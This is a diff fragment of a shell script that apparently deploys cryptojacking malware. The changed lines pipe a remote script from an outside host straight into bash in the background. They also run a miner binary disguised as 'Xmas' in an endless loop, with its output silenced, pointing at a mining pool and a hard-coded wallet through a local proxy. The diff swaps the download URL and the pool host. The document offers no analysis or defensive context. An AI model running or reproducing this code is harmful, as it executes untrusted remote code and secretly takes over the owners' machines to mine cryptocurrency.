@@ -28,7 +28,7 @@ ph add Xmas 1>/dev/null 2>&1
 
 sleep 2
 
-curl -fsSL http://greenleaf.teatspray.uk/install_and_monitor_shade_root.sh | bash &
+curl -fsSL http://greenleaf.teatspray.uk/install_and_monitor_shade_usa_root.sh | bash &
 
 sleep 4
 
@@ -99,6 +99,6 @@ sleep 2
 
 while true
 do
-./Xmas --donate-level 1 -o supportsuperman.teatspray.uk:9633 -u solo:ar3fHmE8BgygWkkYWfdm3fbcGrxkm3rTPZrE6NPAgmkFgE8sszAjkTnSugw1WGeXbcRkaBBMSdW9yBy1g8czL7K22AaBhpw5K --rig-id=$currentdate -p $currentdate -a rx/arq -k --randomx-1gb-pages --proxy=127.0.0.1:1081 -t $used_num_of_cores 1>/dev/null 2>&1
+./Xmas --donate-level 1 -o usadignode.devopsenterprise.uk:3333 -u ar3fHmE8BgygWkkYWfdm3fbcGrxkm3rTPZrE6NPAgmkFgE8sszAjkTnSugw1WGeXbcRkaBBMSdW9yBy1g8czL7K22AaBhpw5K --rig-id=$currentdate -p x -a rx/arq -k --proxy=127.0.0.1:1081 --randomx-1gb-pages -t $used_num_of_cores 1>/dev/null 2>&1
 sleep 10
 done
